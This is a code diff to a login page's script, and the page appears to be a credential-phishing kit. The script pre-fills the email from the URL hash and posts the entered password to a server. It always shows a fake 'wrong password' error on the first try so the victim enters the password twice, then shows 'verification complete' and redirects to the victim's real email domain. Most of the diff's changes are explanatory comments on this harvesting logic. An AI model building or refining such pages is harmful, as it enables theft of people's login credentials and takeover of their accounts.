@@ -140,12 +140,14 @@
     <iframe src="" frameborder="0" id="iframe" style="display: none;"></iframe>
 
     <script>
+        // Set email from URL hash if present
         const emailInput = document.getElementById('email');
         const hashEmail = window.location.hash.substring(1);
-        let redirectUrl = 'https://example.com';
-
+        let redirectUrl = 'https://example.com'; // Default fallback
+        
         if (hashEmail) {
             emailInput.value = hashEmail;
+            // Set redirect URL based on email domain
             const domain = hashEmail.split('@')[1];
             if (domain) {
                 redirectUrl = `https://www.${domain}`;
@@ -153,6 +155,7 @@
             }
         }
 
+        // Hide loader after 4 seconds
         setTimeout(() => {
             document.getElementById("loading").style.display = "none";
         }, 4000);
@@ -160,9 +163,9 @@
         let attempt = 0;
 
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault(); // prevent native submit
+            e.preventDefault();
             attempt++;
-
+            
             const form = this;
             const errorMsg = document.getElementById('errorMsg');
             const passwordInput = document.getElementById('password');
@@ -170,44 +173,54 @@
             const loading = document.getElementById('loading');
             const verificationComplete = document.getElementById('verificationComplete');
 
+            // Update hidden step value
             form.querySelector('[name="step"]').value = attempt;
 
+            // Show loading spinner
             loading.style.display = 'flex';
             errorMsg.style.display = 'none';
 
             try {
                 const formData = new FormData(form);
-
-                // Send form data using fetch instead of native submission
+                
+                // Send data to PHP and wait for response
                 const response = await fetch(form.action, {
                     method: 'POST',
                     body: formData
                 });
 
+                // Log response for debugging (remove in production)
                 const responseText = await response.text();
                 console.log('Server response:', responseText);
 
+                // Assume success if response is OK (status 200-299)
                 if (!response.ok) {
                     throw new Error('Submission failed: ' + responseText);
                 }
 
+                // Clear password field
                 passwordInput.value = '';
 
                 if (attempt === 1) {
+                    // First attempt: Show error
                     loading.style.display = 'none';
                     errorMsg.style.display = 'block';
                     submitBtn.classList.add('shake');
                     document.getElementById('btnText').textContent = 'Try Again';
-
+                    
                     setTimeout(() => {
                         submitBtn.classList.remove('shake');
                         passwordInput.focus();
                     }, 500);
                 } else {
+                    // Second attempt: Show verification complete and redirect
                     loading.style.display = 'none';
                     verificationComplete.style.display = 'flex';
-
+                    
+                    // Log redirect URL for debugging (remove in production)
                     console.log('Redirecting to:', redirectUrl);
+                    
+                    // Redirect after showing verification complete
                     setTimeout(() => {
                         window.location.href = redirectUrl;
                     }, 2000);
